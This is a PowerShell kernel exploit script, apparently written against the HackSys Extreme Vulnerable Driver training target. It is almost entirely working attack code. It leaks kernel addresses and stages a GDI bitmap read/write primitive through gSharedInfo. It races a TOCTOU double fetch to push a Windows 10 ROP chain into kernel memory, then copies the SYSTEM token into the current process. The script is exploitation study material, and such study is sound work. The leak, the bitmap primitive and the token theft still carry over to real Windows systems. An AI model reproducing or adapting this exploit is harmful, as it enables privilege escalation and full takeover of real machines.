Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
  
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
  
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        IntPtr InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);

	[DllImport("kernel32.dll", SetLastError=true)]
	public static extern bool VirtualFree(
		IntPtr lpAddress,
		uint dwSize,
		uint dwFreeType);

	[DllImport("gdi32.dll")]
	public static extern int SetBitmapBits(
		IntPtr hbmp,
		uint cBytes,
		byte[] lpBits);

	[DllImport("gdi32.dll")]
	public static extern int GetBitmapBits(
		IntPtr hbmp,
		int cbBuffer,
		IntPtr lpvBits);

	[DllImport("kernel32.dll", SetLastError=true)]
	public static extern bool FreeLibrary(
		IntPtr hModule);

	[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
	public static extern IntPtr LoadLibrary(
		string lpFileName);

	[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	public static extern IntPtr GetProcAddress(
		IntPtr hModule,
		string procName);
}
"@

#==============================================[Pre-Checks]
# Check logical processor count, race condition requires 2+
echo "`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
if ($([System.Environment]::ProcessorCount) -lt 2) {
	echo "[!] The race condition requires at least 2 CPU cores, exiting!`n"
	Return
}

# Get driver handle
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite,[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
  
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
}

#==============================================[Helpers]
function Get-LoadedModules {
<#
.SYNOPSIS
	Use NtQuerySystemInformation::SystemModuleInformation to get a list of
	loaded modules, their base address and size (x32/x64).
	Note: Low integrity only pre 8.1
.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.EXAMPLE
	C:\PS> $Modules = Get-LoadedModules
	C:\PS> $KernelBase = $Modules[0].ImageBase
	C:\PS> $KernelType = ($Modules[0].ImageName -split "\\")[-1]
	C:\PS> ......
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct SYSTEM_MODULE_INFORMATION
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		public UIntPtr[] Reserved;
		public IntPtr ImageBase;
		public UInt32 ImageSize;
		public UInt32 Flags;
		public UInt16 LoadOrderIndex;
		public UInt16 InitOrderIndex;
		public UInt16 LoadCount;
		public UInt16 ModuleNameOffset;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		internal Char[] _ImageName;
		public String ImageName {
			get {
				return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
			}
		}
	}
	public static class Ntdll
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQuerySystemInformation(
			int SystemInformationClass,
			IntPtr SystemInformation,
			int SystemInformationLength,
			ref int ReturnLength);
	}
"@

	[int]$BuffPtr_Size = 0
	while ($true) {
		[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
		$SystemInformationLength = New-Object Int
	
		# SystemModuleInformation Class = 11
		$CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
		
		# STATUS_INFO_LENGTH_MISMATCH
		if ($CallResult -eq 0xC0000004) {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
		}
		# STATUS_SUCCESS
		elseif ($CallResult -eq 0x00000000) {
			break
		}
		# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
		else {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			return
		}
	}

	$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
	$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
	if ([System.IntPtr]::Size -eq 4) {
		$SYSTEM_MODULE_INFORMATION_Size = 284
	} else {
		$SYSTEM_MODULE_INFORMATION_Size = 296
	}

	$BuffOffset = $BuffPtr.ToInt64()
	$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
	$BuffOffset = $BuffOffset + [System.IntPtr]::Size

	$SystemModuleArray = @()
	for ($i=0; $i -lt $HandleCount; $i++){
		$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
		$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
		
		$HashTable = @{
			ImageName = $Cast.ImageName
			ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
			ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
		}
		
		$Object = New-Object PSObject -Property $HashTable
		$SystemModuleArray += $Object
	
		$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
	}

	$SystemModuleArray

	# Free SystemModuleInformation array
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
}

function Stage-gSharedInfoBitmap {
<#
.SYNOPSIS
    Universal Bitmap leak using accelerator tables, 32/64 bit Win7-10 (post anniversary).
.DESCRIPTION
    Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
.EXAMPLE
	PS C:\Users\b33f> Stage-gSharedInfoBitmap |fl
	
	BitmapKernelObj : -7692235059200
	BitmappvScan0   : -7692235059120
	BitmapHandle    : 1845828432
	
	PS C:\Users\b33f> $Manager = Stage-gSharedInfoBitmap
	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
	FFFFF901030FF000
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class gSharedInfoBitmap
	{
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
		    int nWidth,
		    int nHeight,
		    uint cPlanes,
		    uint cBitsPerPel,
		    IntPtr lpvBits);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
		    string lpFileName);
		
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
		    IntPtr hModule,
		    string procName);
		[DllImport("user32.dll")]
		public static extern IntPtr CreateAcceleratorTable(
		    IntPtr lpaccl,
		    int cEntries);
		[DllImport("user32.dll")]
		public static extern bool DestroyAcceleratorTable(
		    IntPtr hAccel);
	}
"@

	# Check Arch
	if ([System.IntPtr]::Size -eq 4) {
		$x32 = 1
	}

	function Create-AcceleratorTable {
	    [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
	    $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
	    $User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
	    $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
	    if ($x32){
	        $gSharedInfo = $gSharedInfo.ToInt32()
	    } else {
	        $gSharedInfo = $gSharedInfo.ToInt64()
	    }
	    $aheList = $gSharedInfo + [System.IntPtr]::Size
	    if ($x32){
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc # _HANDLEENTRY.Size = 0xC
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
	    } else {
	        $aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
	        $HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 # _HANDLEENTRY.Size = 0x18
	        $phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
	    }

	    $Result = @()
	    $HashTable = @{
	        Handle = $AccelHandle
	        KernelObj = $phead
	    }
	    $Object = New-Object PSObject -Property $HashTable
	    $Result += $Object
	    $Result
	}

	function Destroy-AcceleratorTable {
	    param ($Hanlde)
	    $CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
	}

	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
	    $KernelArray += Create-AcceleratorTable
	    if ($KernelArray.Length -gt 1) {
	        if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
	            Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	            [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
	            $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # # +4 kb size -lt AcceleratorTable
	            break
	        }
	    }
	    Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
	}

	$BitMapObject = @()
	$HashTable = @{
	    BitmapHandle = $BitmapHandle
	    BitmapKernelObj = $($KernelArray[$i].KernelObj)
	    BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}

function Bitmap-Read {
	param ($Address)
	$CallResult = [EVD]::SetBitmapBits($ManagerBitmap.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
	[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
	$CallResult = [EVD]::GetBitmapBits($WorkerBitmap.BitmapHandle, [System.IntPtr]::Size, $Pointer)
	if ($x32Architecture){
		[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
	} else {
		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
	}
	$CallResult = [EVD]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}

function Bitmap-Write {
	param ($Address, $Value)
	$CallResult = [EVD]::SetBitmapBits($ManagerBitmap.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
	$CallResult = [EVD]::SetBitmapBits($WorkerBitmap.BitmapHandle, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}

#==============================================[Payload]
echo "`n[>] Leaking all the things.."
$SystemModuleArray = Get-LoadedModules
$KernelBase = $SystemModuleArray[0].ImageBase
$ManagerBitmap = Stage-gSharedInfoBitmap
$WorkerBitmap = Stage-gSharedInfoBitmap
echo "[+] Kernel Base: 0x$("{0:X}" -f $KernelBase)"
echo "[+] Manager Bitmap: 0x$("{0:X}" -f $($ManagerBitmap.BitmapKernelObj))"
echo "[+] Worker Bitmap: 0x$("{0:X}" -f $($WorkerBitmap.BitmapKernelObj))"
echo "[?] Building ROP payload.."

# ROP Shellcode buffer => Only works on Win10 x64 v1607
# See => https://github.com/Cn33liz/HSEVD-StackOverflowGDI/blob/master/HS-StackOverflowGDI/HS-StackOverflowGDI.c#L262
[Byte[]] $ROP = @(
	[System.BitConverter]::GetBytes($KernelBase + 0x4483f5)       + # pop rax ; ret
	[System.BitConverter]::GetBytes($WorkerBitmap.BitmappvScan0)  + # worker PvScan0 Address
	[System.BitConverter]::GetBytes($KernelBase + 0x4253f6)       + # pop r8 ; ret
	[System.BitConverter]::GetBytes($ManagerBitmap.BitmappvScan0) + # manager PvScan0 Address
	[System.BitConverter]::GetBytes($KernelBase + 0x26d0)         + # mov qword [r8], rax ; ret
	[System.BitConverter]::GetBytes($KernelBase + 0x13a11a)       + # xor rax, rax ; ret
	[System.BitConverter]::GetBytes($KernelBase + 0x4483f6)       + # ret slide
	[System.BitConverter]::GetBytes($KernelBase + 0x4483f6)       + # ret slide
	[System.BitConverter]::GetBytes($KernelBase + 0x4483f6)       + # ret slide
	[System.BitConverter]::GetBytes($KernelBase + 0x4483f6)       + # ret slide
	[System.BitConverter]::GetBytes($KernelBase + 0x4483f6)       + # ret slide
	[System.BitConverter]::GetBytes($KernelBase + 0x4483f6)         # ret slide => nt!IopSynchronousServiceTail+0x1a0
)

#==============================================[exploit]
# Alloc shellcode buffer
$Shellcode = [Byte[]](0x41)*0x808 + $ROP
echo "`n[>] Allocating ring0 ROP payload.."
[IntPtr]$ScPointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $ScPointer, $Shellcode.Length)
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: 0x$("{0:X8}" -f $ScPointer.ToInt64())"

# Alloc IOCTL buffer
$IOCTLBuffer = [System.BitConverter]::GetBytes($ScPointer.ToInt64()) + [System.BitConverter]::GetBytes(0x800)
echo "`n[>] Allocating IOCTL buffer.."
[IntPtr]$IOCTLPointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $IOCTLBuffer.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($IOCTLBuffer, 0, $IOCTLPointer, $IOCTLBuffer.Length)
echo "[+] Payload size: $($IOCTLBuffer.Length)"
echo "[+] Payload address: 0x$("{0:X8}" -f $IOCTLPointer.ToInt64())"

echo "`n[>] Triggering TOCTOU race condition.."
echo "[+] Flipping buffer size"
# PS runspace to flip buffer size
$Runspace = [runspacefactory]::CreateRunspace()
$Runspace.Open()
$SizeRace = [powershell]::Create()
$SizeRace.runspace = $Runspace
[void]$SizeRace.AddScript({
	param($IOCTLPointer)
	while ($true) {
		$Dest = [IntPtr]::Add($IOCTLPointer,8)
		$Size = [System.BitConverter]::GetBytes(0x800)
		[System.Runtime.InteropServices.Marshal]::Copy($Size, 0, $Dest, $Size.Length)
		$Size = [System.BitConverter]::GetBytes(0x868)
		[System.Runtime.InteropServices.Marshal]::Copy($Size, 0, $Dest, $Size.Length)
	}
}).AddArgument($IOCTLPointer)
$AscObj = $SizeRace.BeginInvoke()

echo "[+] Calling DeviceIoControl"
# Start 10 second race to trigger TOCTOU
# It should trigger instantly but you never know..
$SafeGuard = [diagnostics.stopwatch]::StartNew()
while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
	[EVD]::DeviceIoControl($hDevice, 0x222037, $IOCTLPointer, $IOCTLBuffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero)|Out-null
	$BitmapTestRead = Bitmap-Read -Address $KernelBase
	# Does our read return MZ...?
	if ($BitmapTestRead -eq 12894362189) {
		echo "[!] Success, bitmap primitive staged"
		$SizeRace.Stop()
		break
	}
}
$SafeGuard.Stop()

#==============================================[Elevate]
# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
# WARNING offsets are invalid for Pre-RTM images!
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
switch ($OSMajorMinor)
{
	'10.0' # Win10 / 2k16
	{
		$UniqueProcessIdOffset = 0x2e8
		$TokenOffset = 0x358          
		$ActiveProcessLinks = 0x2f0
	}

	'6.3' # Win8.1 / 2k12R2
	{
		$UniqueProcessIdOffset = 0x2e0
		$TokenOffset = 0x348          
		$ActiveProcessLinks = 0x2e8
	}

	'6.2' # Win8 / 2k12
	{
		$UniqueProcessIdOffset = 0x2e0
		$TokenOffset = 0x348          
		$ActiveProcessLinks = 0x2e8
	}

	'6.1' # Win7 / 2k8R2
	{
		$UniqueProcessIdOffset = 0x180
		$TokenOffset = 0x208          
		$ActiveProcessLinks = 0x188
	}
}

# Get EPROCESS entry for System process
echo "`n[>] Leaking SYSTEM _EPROCESS.."
$KernelBase = $SystemModuleArray[0].ImageBase
$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
$KernelHanle = [EVD]::LoadLibrary("$KernelType")
$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
$CallResult = [EVD]::FreeLibrary($KernelHanle)
echo "[+] _EPROCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
echo "[+] SYSTEM _EPROCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)

# Get EPROCESS entry for current process
echo "`n[>] Leaking current _EPROCESS.."
echo "[+] Traversing ActiveProcessLinks list"
$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
while($true) {
	$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
	if ($NextPID -eq $PID) {
		echo "[+] PowerShell _EPROCESS address: 0x$("{0:X}" -f $NextProcess)"
		echo "[+] PID: $NextPID"
		echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
		$PoShTokenAddr = $NextProcess+$TokenOffset
		break
	}
	$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
}

# Duplicate token!
echo "`n[!] Duplicating SYSTEM token!`n"
Bitmap-Write -Address $PoShTokenAddr -Value $SysToken